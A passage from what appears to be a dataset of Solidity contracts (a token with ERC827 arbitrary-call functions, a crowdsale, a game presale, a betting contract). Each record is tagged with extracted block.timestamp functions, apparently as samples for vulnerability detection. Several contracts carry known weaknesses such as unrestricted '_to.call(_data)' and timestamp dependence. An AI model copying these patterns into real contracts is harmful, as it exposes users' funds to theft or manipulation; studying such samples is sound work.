bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract StandardTokenExt is StandardToken, ERC827Token, Recoverable {\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n}\ncontract MintableToken is StandardTokenExt {\n using SafeMathLib for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state);\n event Minted(address receiver, uint amount);\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply_ = totalSupply_.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1eda"
  },
  "filename": "1182.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n if (_a == 0) { return 0; }\n c = _a * _b;\n assert(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n return _a / _b;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n c = _a + _b;\n assert(c >= _a);\n return c;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20 _token, address _to, uint256 _value) internal {\n require(_token.transfer(_to, _value));\n }\n function safeTransferFrom(ERC20 _token, address _from, address _to, uint256 _value) internal {\n require(_token.transferFrom(_from, _to, _value));\n }\n}\ninterface ERC20 {\n function transferFrom(address from, address to, uint256 value) external returns (bool);\n function transfer(address _to, uint256 _value) external returns (bool);\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner() { require(msg.sender == owner); _; }\n constructor() public { owner = msg.sender; }\n function renounceOwnership() public onlyOwner() {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner() {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract BitSongCrowdsale is Ownable{\n using SafeMath for uint256;\n using SafeERC20 for ERC20;\n ERC20 public token;\n address public wallet;\n uint256 public rate;\n uint256 public weiRaised;\n address public kycAdmin;\n uint256 public hardCap;\n uint256 public tokensAllocated;\n uint256 public openingTime;\n uint256 public closingTime;\n uint256 public duration;\n mapping(address => bool) public approvals;\n mapping(address => uint256) public balances;\n event TokenPurchase(address indexed purchaser, uint256 value, uint256 amount);\n event KycApproved(address indexed beneficiary, address indexed admin, bool status);\n event KycRefused(address indexed beneficiary, address indexed admin, bool status);\n modifier onlyKycAdmin() { require(msg.sender == kycAdmin); _; }\n modifier onlyWhileOpen { require(block.timestamp >= openingTime && block.timestamp <= closingTime); _; }\n constructor(uint256 _rate, address _wallet, uint256 _duration, uint256 _hardCap, ERC20 _tokenAddress) public {\n require(_rate > 0);\n require(_wallet != address(0));\n require(_tokenAddress != address(0));\n rate = _rate;\n wallet = _wallet;\n token = _tokenAddress;\n hardCap = _hardCap * 10**18;\n duration = _duration * 1 days;\n }\n function () external payable {\n buyTokens();\n }\n function buyTokens() public onlyWhileOpen() payable {\n require(msg.value > 0);\n require(approvals[msg.sender] == true);\n uint256 weiAmount = msg.value;\n uint256 tokenAmount = weiAmount.mul(rate);\n tokensAllocated = tokensAllocated.add(tokenAmount);\n assert(tokensAllocated <= hardCap);\n weiRaised = weiRaised.add(weiAmount);\n balances[msg.sender] = balances[msg.sender].add(tokenAmount);\n emit TokenPurchase(msg.sender, weiAmount, tokenAmount);\n wallet.transfer(msg.value);\n }\n function withdrawTokens() external {\n require(hasClosed());\n uint256 amount = balances[msg.sender];\n require(amount > 0);\n balances[msg.sender] = 0;\n token.safeTransferFrom(wallet, msg.sender, amount);\n }\n function withdrawTokensFor(address _beneficiary) external {\n require(hasClosed());\n uint256 amount = balances[_beneficiary];\n require(amount > 0);\n balances[_beneficiary] = 0;\n token.safeTransferFrom(wallet, _beneficiary, amount);\n }\n function hasClosed() public view returns (bool) {\n return block.timestamp > closingTime;\n }\n function approveAddress(address _beneficiary) external onlyKycAdmin() {\n approvals[_beneficiary] = true;\n emit KycApproved(_beneficiary, kycAdmin, true);\n }\n function refuseAddress(address _beneficiary) external onlyKycAdmin() {\n approvals[_beneficiary] = false;\n emit KycRefused(_beneficiary, kycAdmin, false);\n }\n function rewardManual(address _beneficiary, uint256 _amount) external onlyOwner() {\n require(_amount > 0);\n require(_beneficiary != address(0));\n tokensAllocated = tokensAllocated.add(_amount);\n assert(tokensAllocated <= hardCap);\n balances[_beneficiary] = balances[_beneficiary].add(_amount);\n }\n function transfer(address _beneficiary, uint256 _amount) external onlyOwner() {\n require(_amount > 0);\n require(_beneficiary != address(0));\n token.safeTransfer(_beneficiary, _amount);\n }\n function setKycAdmin(address _newAdmin) external onlyOwner() {\n kycAdmin = _newAdmin;\n }\n function startDistribution() external onlyOwner() {\n require(openingTime == 0);\n openingTime = block.timestamp;\n closingTime = openingTime.add(duration);\n }\n function setRate(uint256 _newRate) external onlyOwner() {\n rate = _newRate;\n }\n function setClosingTime(uint256 _newTime) external onlyOwner() {\n closingTime = _newTime;\n }\n}",
  "extract_feature": [
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}",
    "function startDistribution() external onlyOwner() {\nrequire(openingTime == 0);\nopeningTime = block.timestamp;\nclosingTime = openingTime.add(duration);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1edb"
  },
  "filename": "124.sol",
  "content": "pragma solidity ^0.4.23;\ncontract AccessAdmin {\n bool public isPaused = false;\n address public addrAdmin;\n event AdminTransferred(address indexed preAdmin, address indexed newAdmin);\n constructor() public {\n addrAdmin = msg.sender;\n }\n modifier onlyAdmin() {\n require(msg.sender == addrAdmin);\n _;\n }\n modifier whenNotPaused() {\n require(!isPaused);\n _;\n }\n modifier whenPaused {\n require(isPaused);\n _;\n }\n function setAdmin(address _newAdmin) external onlyAdmin {\n require(_newAdmin != address(0));\n emit AdminTransferred(addrAdmin, _newAdmin);\n addrAdmin = _newAdmin;\n }\n function doPause() external onlyAdmin whenNotPaused {\n isPaused = true;\n }\n function doUnpause() external onlyAdmin whenPaused {\n isPaused = false;\n }\n}\ncontract AccessService is AccessAdmin {\n address public addrService;\n address public addrFinance;\n modifier onlyService() {\n require(msg.sender == addrService);\n _;\n }\n modifier onlyFinance() {\n require(msg.sender == addrFinance);\n _;\n }\n function setService(address _newService) external {\n require(msg.sender == addrService || msg.sender == addrAdmin);\n require(_newService != address(0));\n addrService = _newService;\n }\n function setFinance(address _newFinance) external {\n require(msg.sender == addrFinance || msg.sender == addrAdmin);\n require(_newFinance != address(0));\n addrFinance = _newFinance;\n }\n function withdraw(address _target, uint256 _amount)\n external\n {\n require(msg.sender == addrFinance || msg.sender == addrAdmin);\n require(_amount > 0);\n address receiver = _target == address(0) ? addrFinance : _target;\n uint256 balance = address(this).balance;\n if (_amount < balance) {\n receiver.transfer(_amount);\n } else {\n receiver.transfer(address(this).balance);\n }\n }\n}\ninterface WarTokenInterface {\n function getFashion(uint256 _tokenId) external view returns(uint16[12]);\n function ownerOf(uint256 _tokenId) external view returns (address);\n function safeTransferByContract(uint256 _tokenId, address _to) external;\n}\ninterface WonderTokenInterface {\n function transferFrom(address _from, address _to, uint256 _tokenId) external;\n function safeGiveByContract(uint256 _tokenId, address _to) external;\n function getProtoIdByTokenId(uint256 _tokenId) external view returns(uint256);\n}\ninterface ManagerTokenInterface {\n function transferFrom(address _from, address _to, uint256 _tokenId) external;\n function safeGiveByContract(uint256 _tokenId, address _to) external;\n function getProtoIdByTokenId(uint256 _tokenId) external view returns(uint256);\n}\ninterface TalentCardInterface {\n function safeSendCard(uint256 _amount, address _to) external;\n}\ninterface ERC20BaseInterface {\n function balanceOf(address _from) external view returns(uint256);\n function transfer(address _to, uint256 _value) external;\n function transferFrom(address _from, address _to, uint256 _value) external returns (bool);\n function approve(address _spender, uint256 _value) external;\n}\ncontract TTCInterface is ERC20BaseInterface {\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) external returns (bool);\n}\ncontract TTPresale is AccessService {\n TTCInterface ttcToken;\n WarTokenInterface warToken;\n ManagerTokenInterface ttmToken;\n WonderTokenInterface ttwToken;\n event ManagerSold(\n address indexed buyer,\n address indexed buyTo,\n uint256 mgrId,\n uint256 nextTokenId\n );\n event WonderSold(\n address indexed buyer,\n address indexed buyTo,\n uint256 wonderId,\n uint256 nextTokenId\n );\n constructor() public {\n addrAdmin = msg.sender;\n addrFinance = msg.sender;\n addrService = msg.sender;\n ttcToken = TTCInterface(0xfB673F08FC82807b4D0E139e794e3b328d63551f);\n warToken = WarTokenInterface(0xDA9c03dFd4D137F926c3cF6953cb951832Eb08b2);\n }\n function() external payable {\n }\n uint64 public nextDiscountTTMTokenId1 = 1;\n uint64 public nextDiscountTTMTokenId6 = 361;\n uint64 public nextCommonTTMTokenId2 = 51;\n uint64 public nextCommonTTMTokenId3 = 131;\n uint64 public nextCommonTTMTokenId7 = 391;\n uint64 public nextCommonTTMTokenId8 = 451;\n uint64 public nextDiscountTTWTokenId1 = 1;\n uint64 public nextCommonTTWTokenId2 = 31;\n function setNextDiscountTTMTokenId1(uint64 _val) external onlyAdmin {\n require(nextDiscountTTMTokenId1 >= 1 && nextDiscountTTMTokenId1 <= 51);\n nextDiscountTTMTokenId1 = _val;\n }\n function setNextDiscountTTMTokenId6(uint64 _val) external onlyAdmin {\n require(nextDiscountTTMTokenId6 >= 361 && nextDiscountTTMTokenId6 <= 391);\n nextDiscountTTMTokenId6 = _val;\n }\n function setNextCommonTTMTokenId2(uint64 _val) external onlyAdmin {\n require(nextCommonTTMTokenId2 >= 51 && nextCommonTTMTokenId2 <= 131);\n nextCommonTTMTokenId2 = _val;\n }\n function setNextCommonTTMTokenId3(uint64 _val) external onlyAdmin {\n require(nextCommonTTMTokenId3 >= 131 && nextCommonTTMTokenId3 <= 211);\n nextCommonTTMTokenId3 = _val;\n }\n function setNextCommonTTMTokenId7(uint64 _val) external onlyAdmin {\n require(nextCommonTTMTokenId7 >= 391 && nextCommonTTMTokenId7 <= 451);\n nextCommonTTMTokenId7 = _val;\n }\n function setNextCommonTTMTokenId8(uint64 _val) external onlyAdmin {\n require(nextCommonTTMTokenId8 >= 451 && nextCommonTTMTokenId8 <= 511);\n nextCommonTTMTokenId8 = _val;\n }\n function setNextDiscountTTWTokenId1(uint64 _val) external onlyAdmin {\n require(nextDiscountTTWTokenId1 >= 1 && nextDiscountTTWTokenId1 <= 31);\n nextDiscountTTWTokenId1 = _val;\n }\n function setNextCommonTTWTokenId2(uint64 _val) external onlyAdmin {\n require(nextCommonTTWTokenId2 >= 31 && nextCommonTTWTokenId2 <= 91);\n nextCommonTTWTokenId2 = _val;\n }\n uint64 public endDiscountTime = 0;\n function setDiscountTime(uint64 _endTime) external onlyAdmin {\n require(_endTime > block.timestamp);\n endDiscountTime = _endTime;\n }\n function setWARTokenAddress(address _addr) external onlyAdmin {\n require(_addr != address(0));\n warToken = WarTokenInterface(_addr);\n }\n function setTTMTokenAddress(address _addr) external onlyAdmin {\n require(_addr != address(0));\n ttmToken = ManagerTokenInterface(_addr);\n }\n function setTTWTokenAddress(address _addr) external onlyAdmin {\n require(_addr != address(0));\n ttwToken = WonderTokenInterface(_addr);\n }\n function setTTCTokenAddress(address _addr) external onlyAdmin {\n require(_addr != address(0));\n ttcToken = TTCInterface(_addr);\n }\n function _getExtraParam(bytes _extraData)\n private\n pure\n returns(address addr, uint64 f, uint256 protoId)\n {\n assembly { addr := mload(add(_extraData, 20)) }\n f = uint64(_extraData[20]);\n protoId = uint256(_extraData[21]) * 256 + uint256(_extraData[22]);\n }\n function receiveApproval(address _sender, uint256 _value, address _token, bytes _extraData)\n external\n whenNotPaused\n {\n require(msg.sender == address(ttcToken));\n require(_extraData.length == 23);\n (address toAddr, uint64 f, uint256 protoId) = _getExtraParam(_extraData);\n require(ttcToken.transferFrom(_sender, address(this), _value));\n if (f == 0) {\n _buyDiscountTTM(_value, protoId, toAddr, _sender);\n } else if (f == 1) {\n _buyDiscountTTW(_value, protoId, toAddr, _sender);\n } else if (f == 2) {\n _buyCommonTTM(_value, protoId, toAddr, _sender);\n } else if (f == 3) {\n _buyCommonTTW(_value, protoId, toAddr, _sender);\n } else {\n require(false, \"Invalid func id\");\n }\n }\n function exchangeByPet(uint256 _warTokenId, uint256 _mgrId, address _gameWalletAddr)\n external\n whenNotPaused\n {\n require(warToken.ownerOf(_warTokenId) == msg.sender);\n uint16[12] memory warData = warToken.getFashion(_warTokenId);\n uint16 protoId = warData[0];\n if (_mgrId == 2) {\n require(protoId == 10001 || protoId == 10003);\n require(nextCommonTTMTokenId2 <= 130);\n warToken.safeTransferByContract(_warTokenId, address(this));\n nextCommonTTMTokenId2 += 1;\n ttmToken.safeGiveByContract(nextCommonTTMTokenId2 - 1, _gameWalletAddr);\n emit ManagerSold(msg.sender, _gameWalletAddr, 2, nextCommonTTMTokenId2);\n } else if (_mgrId == 3) {\n require(protoId == 10001 || protoId == 10003);\n require(nextCommonTTMTokenId3 <= 210);\n warToken.safeTransferByContract(_warTokenId, address(this));\n nextCommonTTMTokenId3 += 1;\n ttmToken.safeGiveByContract(nextCommonTTMTokenId3 - 1, _gameWalletAddr);\n emit ManagerSold(msg.sender, _gameWalletAddr, 3, nextCommonTTMTokenId3);\n } else if (_mgrId == 7) {\n require(protoId == 10002 || protoId == 10004 || protoId == 10005);\n require(nextCommonTTMTokenId7 <= 450);\n warToken.safeTransferByContract(_warTokenId, address(this));\n nextCommonTTMTokenId7 += 1;\n ttmToken.safeGiveByContract(nextCommonTTMTokenId7 - 1, _gameWalletAddr);\n emit ManagerSold(msg.sender, _gameWalletAddr, 7, nextCommonTTMTokenId7);\n } else if (_mgrId == 8) {\n require(protoId == 10002 || protoId == 10004 || protoId == 10005);\n require(nextCommonTTMTokenId8 <= 510);\n warToken.safeTransferByContract(_warTokenId, address(this));\n nextCommonTTMTokenId8 += 1;\n ttmToken.safeGiveByContract(nextCommonTTMTokenId8 - 1, _gameWalletAddr);\n emit ManagerSold(msg.sender, _gameWalletAddr, 8, nextCommonTTMTokenId8);\n } else {\n require(false);\n }\n }\n function buyDiscountTTMByETH(uint256 _mgrId, address _gameWalletAddr)\n external\n payable\n whenNotPaused\n {\n _buyDiscountTTM(msg.value, _mgrId, _gameWalletAddr, msg.sender);\n }\n function buyDiscountTTWByETH(uint256 _wonderId, address _gameWalletAddr)\n external\n payable\n whenNotPaused\n {\n _buyDiscountTTW(msg.value, _wonderId, _gameWalletAddr, msg.sender);\n }\n function buyCommonTTMByETH(uint256 _mgrId, address _gameWalletAddr)\n external\n payable\n whenNotPaused\n {\n _buyCommonTTM(msg.value, _mgrId, _gameWalletAddr, msg.sender);\n }\n function buyCommonTTWByETH(uint256 _wonderId, address _gameWalletAddr)\n external\n payable\n whenNotPaused\n {\n _buyCommonTTW(msg.value, _wonderId, _gameWalletAddr, msg.sender);\n }\n function _buyDiscountTTM(uint256 _value, uint256 _mgrId, address _gameWalletAddr, address _buyer)\n private\n {\n require(_gameWalletAddr != address(0));\n if (_mgrId == 1) {\n require(nextDiscountTTMTokenId1 <= 50, \"This Manager is sold out\");\n if (block.timestamp <= endDiscountTime) {\n require(_value == 0.64 ether);\n } else {\n require(_value == 0.99 ether);\n }\n nextDiscountTTMTokenId1 += 1;\n ttmToken.safeGiveByContract(nextDiscountTTMTokenId1 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 1, nextDiscountTTMTokenId1);\n } else if (_mgrId == 6) {\n require(nextDiscountTTMTokenId6 <= 390, \"This Manager is sold out\");\n if (block.timestamp <= endDiscountTime) {\n require(_value == 0.97 ether);\n } else {\n require(_value == 1.49 ether);\n }\n nextDiscountTTMTokenId6 += 1;\n ttmToken.safeGiveByContract(nextDiscountTTMTokenId6 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 6, nextDiscountTTMTokenId6);\n } else {\n require(false);\n }\n }\n function _buyDiscountTTW(uint256 _value, uint256 _wonderId, address _gameWalletAddr, address _buyer)\n private\n {\n require(_gameWalletAddr != address(0));\n require(_wonderId == 1);\n require(nextDiscountTTWTokenId1 <= 30, \"This Manager is sold out\");\n if (block.timestamp <= endDiscountTime) {\n require(_value == 0.585 ether);\n } else {\n require(_value == 0.90 ether);\n }\n nextDiscountTTWTokenId1 += 1;\n ttwToken.safeGiveByContract(nextDiscountTTWTokenId1 - 1, _gameWalletAddr);\n emit WonderSold(_buyer, _gameWalletAddr, 1, nextDiscountTTWTokenId1);\n }\n function _buyCommonTTM(uint256 _value, uint256 _mgrId, address _gameWalletAddr, address _buyer)\n private\n {\n require(_gameWalletAddr != address(0));\n if (_mgrId == 2) {\n require(nextCommonTTMTokenId2 <= 130);\n require(_value == 0.99 ether);\n nextCommonTTMTokenId2 += 1;\n ttmToken.safeGiveByContract(nextCommonTTMTokenId2 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 2, nextCommonTTMTokenId2);\n } else if (_mgrId == 3) {\n require(nextCommonTTMTokenId3 <= 210);\n require(_value == 0.99 ether);\n nextCommonTTMTokenId3 += 1;\n ttmToken.safeGiveByContract(nextCommonTTMTokenId3 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 3, nextCommonTTMTokenId3);\n } else if (_mgrId == 7) {\n require(nextCommonTTMTokenId7 <= 450);\n require(_value == 1.49 ether);\n nextCommonTTMTokenId7 += 1;\n ttmToken.safeGiveByContract(nextCommonTTMTokenId7 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 7, nextCommonTTMTokenId7);\n } else if (_mgrId == 8) {\n require(nextCommonTTMTokenId8 <= 510);\n require(_value == 1.49 ether);\n nextCommonTTMTokenId8 += 1;\n ttmToken.safeGiveByContract(nextCommonTTMTokenId8 - 1, _gameWalletAddr);\n emit ManagerSold(_buyer, _gameWalletAddr, 8, nextCommonTTMTokenId8);\n } else {\n require(false);\n }\n }\n function _buyCommonTTW(uint256 _value, uint256 _wonderId, address _gameWalletAddr, address _buyer)\n private\n {\n require(_gameWalletAddr != address(0));\n require(_wonderId == 2);\n require(nextCommonTTWTokenId2 <= 90);\n require(_value == 0.50 ether);\n nextCommonTTWTokenId2 += 1;\n ttwToken.safeGiveByContract(nextCommonTTWTokenId2 - 1, _gameWalletAddr);\n emit WonderSold(_buyer, _gameWalletAddr, 2, nextCommonTTWTokenId2);\n }\n function withdrawERC20(address _erc20, address _target, uint256 _amount)\n external\n {\n require(msg.sender == addrFinance || msg.sender == addrAdmin);\n require(_amount > 0);\n address receiver = _target == address(0) ? addrFinance : _target;\n ERC20BaseInterface erc20Contract = ERC20BaseInterface(_erc20);\n uint256 balance = erc20Contract.balanceOf(address(this));\n require(balance > 0);\n if (_amount < balance) {\n erc20Contract.transfer(receiver, _amount);\n } else {\n erc20Contract.transfer(receiver, balance);\n }\n }\n function getPresaleInfo()\n external\n view\n returns(\n uint64 ttmCnt1,\n uint64 ttmCnt2,\n uint64 ttmCnt3,\n uint64 ttmCnt6,\n uint64 ttmCnt7,\n uint64 ttmCnt8,\n uint64 ttwCnt1,\n uint64 ttwCnt2,\n uint64 discountEnd\n )\n {\n ttmCnt1 = 51 - nextDiscountTTMTokenId1;\n ttmCnt2 = 131 - nextCommonTTMTokenId2;\n ttmCnt3 = 211 - nextCommonTTMTokenId3;\n ttmCnt6 = 391 - nextDiscountTTMTokenId6;\n ttmCnt7 = 451 - nextCommonTTMTokenId7;\n ttmCnt8 = 511 - nextCommonTTMTokenId8;\n ttwCnt1 = 31 - nextDiscountTTWTokenId1;\n ttwCnt2 = 91 - nextCommonTTWTokenId2;\n discountEnd = endDiscountTime;\n }\n}",
  "extract_feature": [
    "function setDiscountTime(uint64 _endTime) external onlyAdmin {\nrequire(_endTime > block.timestamp);\nendDiscountTime = _endTime;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1edc"
  },
  "filename": "1256.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ninterface P3DTakeout {\n function buyTokens() external payable;\n}\ncontract Betting {\n using SafeMath for uint256;\n address public owner;\n address house_takeout = 0xf783A81F046448c38f3c863885D9e99D10209779;\n P3DTakeout P3DContract_;\n uint public winnerPoolTotal;\n string public constant version = \"0.2.3\";\n struct chronus_info {\n bool betting_open;\n bool race_start;\n bool race_end;\n bool voided_bet;\n uint32 starting_time;\n uint32 betting_duration;\n uint32 race_duration;\n uint32 voided_timestamp;\n }\n struct horses_info{\n int64 BTC_delta;\n int64 ETH_delta;\n int64 LTC_delta;\n bytes32 BTC;\n bytes32 ETH;\n bytes32 LTC;\n }\n struct bet_info{\n bytes32 horse;\n uint amount;\n }\n struct coin_info{\n uint256 pre;\n uint256 post;\n uint160 total;\n uint32 count;\n bool price_check;\n }\n struct voter_info {\n uint160 total_bet;\n bool rewarded;\n mapping(bytes32=>uint) bets;\n }\n mapping (bytes32 => coin_info) public coinIndex;\n mapping (address => voter_info) voterIndex;\n uint public total_reward;\n uint32 total_bettors;\n mapping (bytes32 => bool) public winner_horse;\n event Deposit(address _from, uint256 _value, bytes32 _horse, uint256 _date);\n event Withdraw(address _to, uint256 _value);\n event PriceCallback(bytes32 coin_pointer, uint256 result, bool isPrePrice);\n event RefundEnabled(string reason);\n constructor() public payable {\n owner = msg.sender;\n horses.BTC = bytes32(\"BTC\");\n horses.ETH = bytes32(\"ETH\");\n horses.LTC = bytes32(\"LTC\");\n P3DContract_ = P3DTakeout(0x72b2670e55139934D6445348DC6EaB4089B12576);\n }\n horses_info public horses;\n chronus_info public chronus;\n modifier onlyOwner {\n require(owner == msg.sender);\n _;\n }\n modifier duringBetting {\n require(chronus.betting_open);\n require(now < chronus.starting_time + chronus.betting_duration);\n _;\n }\n modifier beforeBetting {\n require(!chronus.betting_open && !chronus.race_start);\n _;\n }\n modifier afterRace {\n require(chronus.race_end);\n _;\n }\n function changeOwnership(address _newOwner) onlyOwner external {\n owner = _newOwner;\n }\n function priceCallback (bytes32 coin_pointer, uint256 result, bool isPrePrice ) external onlyOwner {\n require (!chronus.race_end);\n emit PriceCallback(coin_pointer, result, isPrePrice);\n chronus.race_start = true;\n chronus.betting_open = false;\n if (isPrePrice) {\n if (now >= chronus.starting_time+chronus.betting_duration+ 60 minutes) {\n emit RefundEnabled(\"Late start price\");\n forceVoidRace();\n } else {\n coinIndex[coin_pointer].pre = result;\n }\n } else if (!isPrePrice){\n if (coinIndex[coin_pointer].pre > 0 ){\n if (now >= chronus.starting_time+chronus.race_duration+ 60 minutes) {\n emit RefundEnabled(\"Late end price\");\n forceVoidRace();\n } else {\n coinIndex[coin_pointer].post = result;\n coinIndex[coin_pointer].price_check = true;\n if (coinIndex[horses.ETH].price_check && coinIndex[horses.BTC].price_check && coinIndex[horses.LTC].price_check) {\n reward();\n }\n }\n } else {\n emit RefundEnabled(\"End price came before start price\");\n forceVoidRace();\n }\n }\n }\n function placeBet(bytes32 horse) external duringBetting payable {\n require(msg.value >= 0.01 ether);\n if (voterIndex[msg.sender].total_bet==0) {\n total_bettors+=1;\n }\n uint _newAmount = voterIndex[msg.sender].bets[horse] + msg.value;\n voterIndex[msg.sender].bets[horse] = _newAmount;\n voterIndex[msg.sender].total_bet += uint160(msg.value);\n uint160 _newTotal = coinIndex[horse].total + uint160(msg.value);\n uint32 _newCount = coinIndex[horse].count + 1;\n coinIndex[horse].total = _newTotal;\n coinIndex[horse].count = _newCount;\n emit Deposit(msg.sender, msg.value, horse, now);\n }\n function () private payable {}\n function setupRace(uint32 _bettingDuration, uint32 _raceDuration) onlyOwner beforeBetting external payable {\n chronus.starting_time = uint32(block.timestamp);\n chronus.betting_open = true;\n chronus.betting_duration = _bettingDuration;\n chronus.race_duration = _raceDuration;\n }\n function reward() internal {\n horses.BTC_delta = int64(coinIndex[horses.BTC].post - coinIndex[horses.BTC].pre)*100000/int64(coinIndex[horses.BTC].pre);\n horses.ETH_delta = int64(coinIndex[horses.ETH].post - coinIndex[horses.ETH].pre)*100000/int64(coinIndex[horses.ETH].pre);\n horses.LTC_delta = int64(coinIndex[horses.LTC].post - coinIndex[horses.LTC].pre)*100000/int64(coinIndex[horses.LTC].pre);\n total_reward = (coinIndex[horses.BTC].total) + (coinIndex[horses.ETH].total) + (coinIndex[horses.LTC].total);\n if (total_bettors <= 1) {\n emit RefundEnabled(\"Not enough participants\");\n forceVoidRace();\n } else {\n uint house_fee = total_reward.mul(5).div(100);\n require(house_fee < address(this).balance);\n total_reward = total_reward.sub(house_fee);\n house_takeout.transfer(house_fee);\n uint p3d_fee = house_fee/2;\n require(p3d_fee < address(this).balance);\n total_reward = total_reward.sub(p3d_fee);\n P3DContract_.buyTokens.value(p3d_fee)();\n }\n if (horses.BTC_delta > horses.ETH_delta) {\n if (horses.BTC_delta > horses.LTC_delta) {\n winner_horse[horses.BTC] = true;\n winnerPoolTotal = coinIndex[horses.BTC].total;\n }\n else if(horses.LTC_delta > horses.BTC_delta) {\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.LTC].total;\n } else {\n winner_horse[horses.BTC] = true;\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.BTC].total + (coinIndex[horses.LTC].total);\n }\n } else if(horses.ETH_delta > horses.BTC_delta) {\n if (horses.ETH_delta > horses.LTC_delta) {\n winner_horse[horses.ETH] = true;\n winnerPoolTotal = coinIndex[horses.ETH].total;\n }\n else if (horses.LTC_delta > horses.ETH_delta) {\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.LTC].total;\n } else {\n winner_horse[horses.ETH] = true;\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.ETH].total + (coinIndex[horses.LTC].total);\n }\n } else {\n if (horses.LTC_delta > horses.ETH_delta) {\n winner_horse[horses.LTC] = true;\n winnerPoolTotal = coinIndex[horses.LTC].total;\n } else if(horses.LTC_delta < horses.ETH_delta){\n winner_horse[horses.ETH] = true;\n winner_horse[horses.BTC] = true;\n winnerPoolTotal = coinIndex[horses.ETH].total + (coinIndex[horses.BTC].total);\n } else {\n winner_horse[horses.LTC] = true;\n winner_horse[horses.ETH] = true;\n winner_horse[horses.BTC] = true;\n winnerPoolTotal = coinIndex[horses.ETH].total + (coinIndex[horses.BTC].total) + (coinIndex[horses.LTC].total);\n }\n }\n chronus.race_end = true;\n }\n function calculateReward(address candidate) internal afterRace constant returns(uint winner_reward) {\n voter_info storage bettor = voterIndex[candidate];\n if(chronus.voided_bet) {\n winner_reward = bettor.total_bet;\n } else {\n uint winning_bet_total;\n if(winner_horse[horses.BTC]) {\n winning_bet_total += bettor.bets[horses.BTC];\n } if(winner_horse[horses.ETH]) {\n winning_bet_total += bettor.bets[horses.ETH];\n } if(winner_horse[horses.LTC]) {\n winning_bet_total += bettor.bets[horses.LTC];\n }\n winner_reward += (((total_reward.mul(10000000)).div(winnerPoolTotal)).mul(winning_bet_total)).div(10000000);\n }\n }\n function checkReward() afterRace external constant returns (uint) {\n require(!voterIndex[msg.sender].rewarded);\n return calculateReward(msg.sender);\n }\n function claim_reward() afterRace external {\n require(!voterIndex[msg.sender].rewarded);\n uint transfer_amount = calculateReward(msg.sender);\n require(address(this).balance >= transfer_amount);\n 